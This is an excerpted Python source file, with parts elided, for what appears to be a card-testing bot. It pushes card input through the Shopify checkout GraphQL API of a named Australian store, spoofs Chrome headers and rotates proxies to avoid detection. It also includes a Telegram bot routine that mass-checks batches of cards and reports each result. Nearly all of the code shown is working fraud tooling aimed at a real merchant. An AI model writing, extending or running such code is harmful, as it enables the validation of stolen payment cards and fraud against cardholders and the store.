...
async def sh(card_input: str):
    ...
    async with aiohttp.ClientSession(connector=connector) as r:
        ...
        headers = {
            'authority': 'www.www.healthyfocus.com.au',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.healthyfocus.com.au',
            'referer': 'https://www.healthyfocus.com.au/products/certified-organic-produce-bags-single?variant=41790927437881',
        ...
        headers = {
            ...
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.healthyfocus.com.au',
            'referer': 'https://www.healthyfocus.com.au/cart',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        ...
        headers = {
            ...
            'x-checkout-web-build-id': '96dc83c423000d2c1f7815cc6fcebe510c852f4e',
        ...
        json_data = {
            ...
            'variables': {
                        ...
                        'deliveryLines': [
                            {
                                ...
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': 'f49eebc2acd89a32b563ee6616388c7b-338e2eb050be43c581e79dcd6071d791',
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariant/41790927437881',
                                        'variantId': 'gid://shopify/ProductVariant/41790927437881',
                                        'properties': [],
                                        'sellingPlanId': None,
                ...
                'analytics': {
                    ...
                    'pageId': '346c3ec0-8DC0-4784-034F-224085EC89D2',
                },
            },
            'operationName': 'SubmitForCompletion',
        }
        ...
        try:
            async with r.post(
                ...
                text = await response.text()
                if response.status != 200:
                    log_event("ERROR", f"GraphQL SubmitForCompletion failed: {response.status} - {text}", None)
                    return ShResult("GraphQL SubmitForCompletion failed", time.time()-start_time, proxy_status)
                
                try:
                    res_json = json.loads(text)
                except json.JSONDecodeError:
                    log_event("ERROR", f"GraphQL JSON decode error: {text}", None)
                    return ShResult("GraphQL decode error", time.time()-start_time, proxy_status)
                
                # Check for errors in the GraphQL response
                if 'data' not in res_json or 'submitForCompletion' not in res_json['data']:
                    error_msg = res_json.get('errors', [{}])[0].get('message', 'Unknown error') if 'errors' in res_json else 'No data'
                    log_event("ERROR", f"GraphQL response error: {error_msg}", None)
                    return ShResult(f"GraphQL error: {error_msg}", time.time()-start_time, proxy_status)
                
                try:
                    rid = res_json['data']['submitForCompletion']['receipt']['id']
                    log_event("INFO", "GraphQL submission success", None)
                except (KeyError, TypeError):
                    error_msg = "Missing receipt ID in GraphQL response"
                    if 'errors' in res_json:
                        error_msg = f"GraphQL errors: {res_json['errors']}"
                    log_event("ERROR", error_msg, None)
                    return ShResult(error_msg, time.time()-start_time, proxy_status)
        except asyncio.TimeoutError:
            proxy_manager.mark_bad(proxy)
            proxy_status = "Dead"
...
async def run_mass_check(context, update, user_id, cards, msg):
    ...
    for i in range(0, total_cards, batch_size):
        ...
        keyboard = [
            ...
            [InlineKeyboardButton(f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞💎: {last_response}", callback_data='response')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
